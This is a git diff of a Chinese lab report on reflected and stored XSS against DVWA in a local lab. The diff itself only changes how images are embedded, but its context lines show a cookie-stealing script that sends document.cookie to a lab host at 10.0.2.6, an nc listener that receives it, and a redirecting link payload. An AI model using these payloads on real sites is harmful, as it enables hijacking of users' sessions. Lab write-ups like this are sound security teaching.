@@ -12,7 +12,7 @@
 * php+html+java
 * 虚拟机配置如下图
 
-![](/image/1.png)
+<img src="image/1.png" />
 
 ## 实验过程
 
@@ -26,7 +26,7 @@
 
 查看源码，可以看到，在安全等级为低时，源码中没有对用户提交的数据做任何处理，只是简单判断如果提交的数据是否存在且不为空，就输出Hello+提交的内容
 
-![](/image/4.png)
+<img src="image/4.png" />
 
 测试代码：
 
@@ -37,9 +37,9 @@
 
 测试截图：
 
-![](/image/2.png)
+<img src="image/2.png" />
 
-![](/image/3.png)
+<img src="image/3.png" />
 
 #### 获取cookie实验
 
@@ -52,7 +52,7 @@
 
 首先测试构造获取cookie的JavaScript代码：`<script>alert(document.cookie)</script>`，如图
 
-![](/image/5.png)
+<img src="image/5.png" />
 
 在本机/var/www/html中制作一个js脚本
 
@@ -61,7 +61,7 @@ var img = new Image();
 img.src = "http://10.0.2.6:88/cookies.php?cookie="+document.cookie;
 ```
 
-![](/image/6.png)
+<img src="image/6.png" />
 
 在kali中使用`nc -vnlp 88`进行监听，在DVWA平台进行测试此行代码，可获取到用户cookie
 
@@ -69,7 +69,7 @@ img.src = "http://10.0.2.6:88/cookies.php?cookie="+document.cookie;
 <script src='http://10.0.2.6/xxsec.js'></script>
 ```
 
-![](/image/7.png)
+<img src="image/7.png" />
 
 ### 存储型xss攻击
 
@@ -83,9 +83,9 @@ img.src = "http://10.0.2.6:88/cookies.php?cookie="+document.cookie;
 <a href=http://10.0.2.6>登录</a>；//点击 ' 登录 '，直接跳转到http://10.0.2.6页面（自己搭建的服务器界面）
 ```
 
-![](/image/8.png)
+<img src="image/8.png" />
 
-![](/image/9.png)
+<img src="image/9.png" />
 
 * 注：每次实验后都需重置数据库
 
@@ -98,7 +98,7 @@ var img = new Image();
 img.src = "http://10.0.2.6:88/cookies.php?cookie="+document.cookie;
 ```
 
-![](/image/6.png)
+<img src="image/6.png" />
 
 在kali中使用`nc -vnlp 88`进行监听，在DVWA平台进行测试此行代码，可获取到用户cookie
 
@@ -106,9 +106,9 @@ img.src = "http://10.0.2.6:88/cookies.php?cookie="+document.cookie;
 <script src='http://10.0.2.6/xxsec.js'></script>
 ```
 
-![](/image/10.png)
+<img src="image/10.png" />
 
-![](/image/11.png)
+<img src="image/11.png" />
 
 ## 防护手段
 
